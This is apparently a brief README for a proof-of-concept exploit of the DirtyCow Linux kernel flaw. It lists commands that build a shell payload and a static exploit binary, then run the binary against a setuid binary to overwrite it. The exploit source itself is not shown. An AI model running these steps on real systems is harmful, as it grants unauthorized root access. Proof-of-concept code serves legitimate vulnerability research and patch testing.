# dc
Proof of concept for DirtyCow

```
$ musl-gcc ./sh.s -Os -s -nostdlib
$ xxd -i ./a.out > a.out.h
$ musl-gcc -Os -s -static ./dc.c -o dc
$ ./dc <path_to_setuid_binary> <output_file>
```
